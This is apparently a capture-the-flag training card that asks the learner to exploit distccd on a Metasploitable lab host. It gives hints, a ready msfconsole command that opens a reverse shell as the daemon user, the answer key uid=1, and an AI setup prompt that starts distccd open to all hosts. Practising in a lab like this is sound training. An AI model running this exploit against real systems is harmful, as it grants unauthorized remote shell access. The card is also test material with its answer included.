# Q045 — distccd Command Execution

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `metasploit` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Exploit distccd (port 3632) on Metasploitable using `exploit/unix/misc/distcc_exec`. Report the **uid** captured.

---

## 🎯 Flag Format

```
uid=<n>
```

Example: `uid=1`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Module distcc_exec — gives daemon-user shell.
</details>

<details>
<summary>Hint 2</summary>

Then need privesc to root.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS 192.168.52.129; set LHOST 192.168.52.128; run'
```

Returns shell as `daemon` (uid=1).

**Answer:** `uid=1`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q045:
1. Verify Metasploitable2 (192.168.52.129) up; distccd running: ssh msfadmin@192.168.52.129 → sudo service distcc status (or ps aux | grep distccd; start with /usr/bin/distccd --daemon --allow 0.0.0.0/0 if needed).
2. From Parrot: nmap -p 3632 192.168.52.129 — open.
3. msfconsole ready; LHOST 192.168.52.128 reachable on 4444.

Report back: "Lab ready for Q045 — distccd 3632 open on 192.168.52.129".
```
